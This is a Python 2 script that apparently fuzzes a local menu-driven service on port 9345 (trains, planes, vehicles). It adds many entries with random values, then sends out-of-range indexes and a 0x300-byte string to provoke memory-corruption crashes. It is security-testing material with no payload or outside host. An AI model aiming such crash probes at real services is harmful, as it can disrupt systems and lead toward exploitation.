#!/usr/bin/python
import errno
import socket
import random
import sys
import time

def possible(p):
    r = random.randint(0, 100)
    p  = p * 100
    if r < p: 
        return True
    return False

def make_string():
    return random.choice(['A' * 0x10, 'B' * 0x10, 'C' * 0x10])

def make_int():
    if possible(0.1):
        return '-100'
    return random.choice(['%d' % random.randint(-2, 0x7fff)])

def make_small_int():
    return random.choice(['%d' % random.randint(-2, 10)])

def make_float():
    return random.choice(['%d.%d' % (random.randint(-2, 0x7fff), random.randint(0, 0x7ffff))])

def recvall(s, expect = None, hexprint = False):
    ret = ''
    if hexprint:
        print ''
    while True:
        ch = s.recv(1)
        
        if hexprint:
            sys.stdout.write('%.2x ' % ord(ch))
            sys.stdout.flush()

            if len(ret) > 0 and  len(ret) % 80 == 79:
                sys.stdout.write('\n')
                sys.stdout.flush()
        else:
            sys.stdout.write(ch)
            sys.stdout.flush()
        if len(ch) == 0: break
        ret += ch

        if 'HTTP/1.1 500 Internal Server Error' in ret:
            recvall(s, '\a')
            s.close()

        if expect != None:
            if type(expect) == str and ret.endswith(expect):
                break

            if type(expect) == list:
                for aa in expect:
                    if ret.endswith(aa):
                        return ret

    if hexprint:
        print ''
    return ret

def sendall(s, data):
    sys.stdout.write(data)
    sys.stdout.flush()
    s.sendall(data)

def add_plane():
    recvall(s, ">")
    sendall(s, '1\n')
    recvall(s, 'Enter the Manufacturer: ')
    sendall(s, make_string() + '\n')
    recvall(s, 'Enter the Passenger Count: ')
    sendall(s, make_int() + '\n')
    recvall(s, 'Enter the Type: ')
    sendall(s, make_string() + '\n')
    recvall(s, 'Enter the Cost: ')
    sendall(s, make_float() + '\n')
    recvall(s, 'Enter the MPH: ')
    sendall(s, make_float() + '\n')

def add_vehicle():
    recvall(s, ">")
    sendall(s, '1\n')
    recvall(s, 'Make: ')
    sendall(s, make_string() + '\n')
    recvall(s, 'Model: ')
    sendall(s, make_string() + '\n')
    recvall(s, 'Year: ')
    sendall(s, make_int() + '\n')
    recvall(s, 'MPG: ')
    sendall(s, make_int() + '\n')
    recvall(s, 'Cost: ')
    sendall(s, make_int() + '\n')

def remove_vehicle(idx):
    recvall(s, ">")
    sendall(s, '3\n')

    recvall(s, "(y/n):")
    sendall(s, "y")

    recvall(s, "index:")
    sendall(s, str(idx))

def print_plane():
    sendall(s, '2\n')

def print_train():
    sendall(s, '2\n')

def add_train():
    recvall(s, ":")
    sendall(s, '1\n')
    recvall(s, 'Enter the Name: ')
    sendall(s, make_string() + '\n')
    recvall(s, 'Enter the Model: ')
    sendall(s, make_string() + '\n')
    recvall(s, 'Enter the Type: ')
    sendall(s, make_string() + '\n')
    recvall(s, 'Enter the Max Speed: ')
    sendall(s, make_float() + '\n')
    recvall(s, 'Enter the Max Passengers: ')
    sendall(s, make_int() + '\n')

def remove_train(aa):
    sendall(s, '3\n')
    recvall(s, '(y/n): ')
    sendall(s, 'n\n')
    recvall(s, 'Enter the index: ')
    sendall(s, '%d\n' % aa)

s = socket.create_connection(('localhost', 9345))

request = 'GET /trains HTTP/1.0\n\n'
sendall(s, request)

for xx in range(0x20):
    add_train()

recvall(s, ':')
sendall(s, '7\n')

for xx in range(10):
    recvall(s, '[+] Enter Index: ')
    sendall(s, '9999\n')

xxxx = 't' * 0x300

recvall(s, '[+] Enter Index: ')
sendall(s, '%s\n' % xxxx)
